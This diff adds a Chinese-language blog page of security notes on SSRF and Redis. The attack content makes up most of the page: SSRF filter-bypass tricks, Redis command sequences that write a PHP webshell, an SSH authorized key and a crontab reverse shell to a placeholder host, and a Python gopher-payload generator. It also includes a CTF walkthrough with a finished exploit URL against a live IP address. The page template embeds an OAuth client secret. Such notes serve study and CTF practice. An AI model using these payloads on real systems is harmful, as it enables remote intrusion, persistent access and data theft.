@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SSRF+Redis | Twe1ve&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <meta name="description" content="猪猪侠SSRF议题 形成SSRF的代码示例： &lt;?php function curl($url){   $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); } $url &#x3D; $_GET[&amp;apo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF+Redis">
+<meta property="og:url" content="https://github.com/2020/05/19/SSRF-Redis/index.html">
+<meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="猪猪侠SSRF议题 形成SSRF的代码示例： &lt;?php function curl($url){   $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); } $url &#x3D; $_GET[&amp;apo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2020/05/19/SSRF-Redis/1.png">
+<meta property="og:image" content="https://github.com/2020/05/19/SSRF-Redis/2.png">
+<meta property="og:image" content="https://github.com/2020/05/19/SSRF-Redis/3.png">
+<meta property="article:published_time" content="2020-05-19T09:02:15.000Z">
+<meta property="article:modified_time" content="2020-05-19T09:12:21.671Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2020/05/19/SSRF-Redis/1.png">
+  
+    <link rel="icon" href="/images/icon.png">
+  
+  
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+  <!-- 百度站長統計-->
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
+</head>
+
+<div class="main height-100 flex flex-v">
+  <div class="phone-header">
+    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
+    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
+  </div>
+  <div class="main-top flex flex1">
+    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
+    <!--主页上左部分-->
+    <div class="height-100 main-left  flex flex-v">
+      <div class="main-left-top flex1">
+        <a class="logo">
+          <img src="/images/logo.svg" />
+          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
+        </a>
+        <nav class="nav">
+
+  
+    
+      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
+        <div class="icon"><i class="iconfont icon-home"></i></div>
+        <div class="name">
+          <div class="cnname">首页</div>
+          <div class="enname">Home Page</div>
+        </div>
+      </a>
+
+    
+      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
+        <div class="icon"><i class="iconfont icon-archives"></i></div>
+        <div class="name">
+          <div class="cnname">归档</div>
+          <div class="enname">Archive Page</div>
+        </div>
+      </a>
+
+    
+      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
+        <div class="icon"><i class="iconfont icon-about"></i></div>
+        <div class="name">
+          <div class="cnname">关于我</div>
+          <div class="enname">About Me</div>
+        </div>
+      </a>
+
+    
+  
+
+  <!--<a href="/link/">
+    <div class="icon"><i class="iconfont icon-link"></i></div>
+    <div class="name">
+      <div class="cnname">友情链接</div>
+      <div class="enname">Friends Web Link</div>
+    </div>
+  </a>-->
+</nav>
+
+      </div>
+
+      <view class="website-msg">
+        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
+        <!--
+        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
+        -->
+        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
+      </view>
+
+      <div class="social flex flex-align-center ">
+        
+          
+            
+          
+        
+      </div>
+    </div>
+    <!--主页上右部分-->
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">SSRF+Redis</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· May 19, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <p><a href="https://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf" target="_blank" rel="noopener">猪猪侠SSRF议题</a></p>
+<p>形成SSRF的代码示例：</p>
+<pre><code>&lt;?php
+function curl($url){  
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_exec($ch);
+curl_close($ch);
+}
+$url = $_GET[&apos;url&apos;];
+curl($url);
+?&gt;</code></pre><h2 id="SSRF绕过限制："><a href="#SSRF绕过限制：" class="headerlink" title="SSRF绕过限制："></a>SSRF绕过限制：</h2><ol>
+<li><p>利用短网址</p>
+</li>
+<li><p>xip.io  –&gt; 127.0.0.1.xip.io</p>
+</li>
+<li><p>@符号绕过 –&gt; <a href="http://www.baidu.com@127.0.0.1" target="_blank" rel="noopener">www.baidu.com@127.0.0.1</a> —&gt;访问127.0.0.1（利用解析问题绕过）</p>
+</li>
+<li><p>dns rebinding ： <a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p>
+</li>
+<li><p>更改ip地址写法，如十六进制 <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> —&gt;<a href="http://0177.0.0.1" target="_blank" rel="noopener">http://0177.0.0.1</a></p>
+</li>
+<li><p>协议层请求绕过  —&gt; 请求带有事先设计跳转的页面file ftp（302跳转）</p>
+ <?php
+ header("Location:file:///etc/passwd")
+ ?>
+
+</li>
+</ol>
+<h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><h2 id="绝对路径写webshell："><a href="#绝对路径写webshell：" class="headerlink" title="绝对路径写webshell："></a><strong>绝对路径写webshell：</strong></h2><ul>
+<li>flushall</li>
+<li>set 1 ‘<?php system($_GET["cmd"]);?>‘ </li>
+<li>config set dir /var/www/html</li>
+<li>config set dbfilename shell.php</li>
+<li>save</li>
+</ul>
+<p>写ssh公钥：</p>
+<pre><code>ssh-keygen -t rsa ###生成公钥</code></pre><ul>
+<li>flushall</li>
+<li>set 1 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDw2hZflPUjUwuzH6yIgXRiZtBa4L9I6nFqaTH7OELXd4ErUUm4ucBcQBXJqD9wilAepPDKqVohWITXQdLUzyi7ICHrhgVELjk3JRdJ6aJFYJEtXpTi1wJYCaV1Jb9WidF7Jfb2B7rp/TWI0HOORNQJCmA04iFXRAaER1cQTq0ZW+/iB03uTrr5rbmgg/MlwJFa4vSgGSskI2xJ2NOpz4LLBQaybs8VBgr7IqaBcNl55qiZoWcILCVxSW0IyNiPVrLc1nI/oi2sOrFoaGSFFZp35ne9TKzeYyZl5LY3enX1eepNGW1MMYf5NdCcDHjvjcYVa20jqpvD6jDFhOjCfk/nMt1FTRB79LiZ/KKNkdUUZzauTqyyYjZsWKZ1+CcKjk7nVsfFINI8Ap/sGd4J/LXw5QaepKTx+DTmom7c67bYhnFheOQVWusmtghYiC/1UYIyLOayrgLiwt5xIsb5KjgMN29PJpf7zxpUV/TgbgkYLFzNt2CP5u5aWyXdRDyA/K0=</li>
+<li>config set dir /root/.ssh/</li>
+<li>config set dbfilename authorized_keys</li>
+<li>save</li>
+</ul>
+<p><strong>写contrab定时任务反弹shell：</strong></p>
+<ul>
+<li>flushall</li>
+<li>set 1 ‘\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1\n\n’</li>
+<li>config set dir /var/spool/cron/</li>
+<li>config set dbfilename root</li>
+<li>save</li>
+</ul>
+<h2 id="SSRF-Redis利用"><a href="#SSRF-Redis利用" class="headerlink" title="SSRF+Redis利用"></a>SSRF+Redis利用</h2><ul>
+<li>http、https 内网服务探测</li>
+<li>file-读取文本</li>
+<li>file:///etc/passwd</li>
+<li>….</li>
+<li>dict 用于泄露软件安装版本信息探测端口、操作redis（但由于空格问题，无法正常写入文件）</li>
+</ul>
+<p>dict://127.0.0.1:6379/info<br>dict://127.0.0.1:6379/getuser<br>dict://127.0.0.1:6379/flushall</p>
+<p><strong>gopher 万能协议反弹shell：(redis利用需要REST编码)</strong></p>
+<p>Gopher协议中需要对paylaod进行编码；空格用%0a,回车换行使用%0d%0a，参数之间的分隔符也用URL编码<br>转换Redis RESP格式脚本<a href="https://xz.aliyun.com/t/5665#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665#toc-4</a><br>根据需求更改payload、filename、path的值</p>
+<pre><code>import urllib
+protocol=&quot;gopher://&quot;
+ip=&quot;127.0.0.1&quot;
+port=&quot;6379&quot;
+payload=&quot;\n\n&lt;?php system($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;
+filename=&quot;shell.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+ &quot;set 1 {}&quot;.format(payload.replace(&quot; &quot;,&quot;${IFS}&quot;)),
+ &quot;config set dir {}&quot;.format(path),
+ &quot;config set dbfilename {}&quot;.format(filename),
+ &quot;save&quot;
+ ]
+if passwd:
+cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+CRLF=&quot;\r\n&quot;
+redis_arr = arr.split(&quot; &quot;)
+cmd=&quot;&quot;
+cmd+=&quot;*&quot;+str(len(redis_arr))
+for x in redis_arr:
+cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
+cmd+=CRLF
+return cmd
+if __name__==&quot;__main__&quot;:
+for x in cmd:
+payload += urllib.quote(redis_format(x))
+print payload</code></pre><p><strong>ubuntu无法写crontab反弹shell： <a href="https://xz.aliyun.com/t/1800" target="_blank" rel="noopener">https://xz.aliyun.com/t/1800</a></strong></p>
+<p><img src="1.png" alt=""></p>
+<h2 id="SSRF利用redis之不换行"><a href="#SSRF利用redis之不换行" class="headerlink" title="SSRF利用redis之不换行"></a><a href="https://dzmitry-savitski.github.io/2018/07/redis-ssrf-exploits-without-new-line" target="_blank" rel="noopener">SSRF利用redis之不换行</a></h2><ul>
+<li>FLUSHALL</li>
+<li>config set dir /var/www/html/</li>
+<li>set a1 ZY%16%0E%16F</li>
+<li>set a2 ffffff</li>
+<li>BITOP XOR payload a1 a2</li>
+<li>append payload eval($_GET[c]);%3f&gt;</li>
+<li>config set dbfilename cmd.php</li>
+<li>save</li>
+</ul>
+<p>Gopher有如下几点问题</p>
+<ol>
+<li>PHP的curl默认不跟随302跳转</li>
+<li>curl7.43gopher协议存在%00截断的BUG，v7.45以上可用</li>
+<li>file_get_contents()的SSRF，gopher协议不能使用URLencode</li>
+<li>file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</li>
+</ol>
+<h2 id="SSRF-打内网之POST请求-CTF题目"><a href="#SSRF-打内网之POST请求-CTF题目" class="headerlink" title="SSRF 打内网之POST请求(CTF题目)"></a>SSRF 打内网之POST请求(CTF题目)</h2><p><a href="http://152.136.63.75:8016/index.php?url=" target="_blank" rel="noopener">http://152.136.63.75:8016/index.php?url=</a>    —&gt;存在SSRF</p>
+<p>目录扫描发现 <a href="http://152.136.63.75:8016/webshe11231231231.php" target="_blank" rel="noopener">http://152.136.63.75:8016/webshe11231231231.php</a> 页面</p>
+<p>view-source:<a href="http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php" target="_blank" rel="noopener">http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php</a>   —&gt;file读取webshell源码</p>
+<pre><code>&lt;?php
+
+$serverList = array(
+&quot;127.0.0.1&quot;
+);
+$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+foreach ($serverList as $host) {
+if ($ip === $host) {
+if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {
+@eval($_POST[&apos;hacker&apos;]);
+} else {
+die(&quot;You aren&apos;t admin!&quot;);
+}
+} else {
+die(&apos;This is webshell&apos;);
+}
+}</code></pre><p>GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：</p>
+<pre><code>exp = &apos;&apos;&apos;\
+POST /webshe11231231231.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: deflate
+DNT: 1
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);
+&apos;&apos;&apos;
+import urllib
+tmp = urllib.quote(exp)
+new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)
+result = &quot;_&quot;+urllib.quote(new)
+print result</code></pre><p>更改命令的时候Content-Length的值也需要修改<br>根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”</p>
+<p><img src="2.png" alt=""></p>
+<p>如上图所示，所以需要两次编码</p>
+<p>生成paylaod：</p>
+<pre><code>kali@kali:~$ python exp.py
+_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A</code></pre><p>最后exp：</p>
+<pre><code>152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A</code></pre><p><img src="3.png" alt=""></p>
+
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
+
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
+  </div>
+  <!--
+  <div class="main-bottom">
+    <div class="music flex flex-pack-justify flex-align-center">
+      <div class="control">
+        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
+        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
+        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
+      </div>
+      <div class="msg">
+        <span class="time"></span>
+        <div class="line" ref="progress-line-warp">
+          <div class="song-msg">周杰伦 - 说好不哭</div>
+          <!--<div class="current-line" ref="progress-line">
+            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
+          </div>-->
+        </div>
+        <span class="all-time"></span>
+      </div>
+      <div class="right-control">
+        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
+          <span class="iconfont icon-ttpodicon"></span>
+          <span class="number flex1">3</span>
+        </a>
+      </div>
+      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+  </div>
+  <div class="music-list">
+    <div id="musiclist">
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">说好不哭 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">爱在西元前 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">龙拳 - 周杰伦</span>
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+<script>
+  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
+  let musics = $('.music-item')
+  musics.eq(playIndex).addClass('active')
+  var audio = document.getElementById("audio");
+
+  $('.song-msg').html(musics[playIndex].dataset.name)
+  audio.src = musics[playIndex].dataset.url
+
+
+  var playbtn = document.getElementsByClassName("play-icon")[0];
+  var playing = false;
+  audio.loop = false;
+  audio.addEventListener('ended', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  audio.addEventListener('play', function () {
+    playbtn.classList.remove("icon-kaishi1")
+    playbtn.classList.add("icon-kaishi")
+    playing= true
+  }, false);
+  audio.addEventListener('pause', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  function toogleShowMusicList() {
+    var musiclist = document.getElementsByClassName("music-list")[0];
+    if(musiclist.className.indexOf("active") === -1){
+      musiclist.classList.add("active")
+    }else{
+      musiclist.classList.remove("active");
+    }
+  }
+
+  function playControl() {
+    if(playing){
+      audio.pause()
+    }else{
+      audio.play()
+    }
+  }
+
+  function changePlayIndex(index) {
+    if(playIndex !== index){
+      localStorage.setItem('playIndex',index)
+      playIndex = index
+      musics.removeClass('active')
+      musics.eq(playIndex).addClass('active')
+      $('.song-msg').html(musics[playIndex].dataset.name)
+      audio.src = musics[playIndex].dataset.url
+      audio.play()
+    }else{
+      playControl()
+    }
+  }
+
+  function preSong() {
+    var index
+    if(playIndex === 0){
+      index = musics.length - 1
+    }else{
+      index = playIndex - 1
+    }
+    changePlayIndex(index)
+  }
+
+  function nextSong() {
+    var index
+    if(playIndex === musics.length - 1){
+      index = 0
+    }else{
+      index = playIndex + 1
+    }
+    changePlayIndex(index)
+  }
+-->
+  function toggleMenu() {
+    var mainLeft = $('.main-left')
+    if(mainLeft.hasClass('active')){
+      mainLeft.removeClass('active')
+      $('.menu').removeClass('icon-close')
+      $('.menu').addClass('icon-menu')
+    }else{
+      mainLeft.addClass('active')
+      $('.menu').removeClass('icon-menu')
+      $('.menu').addClass('icon-close')
+    }
+  }
+</script>
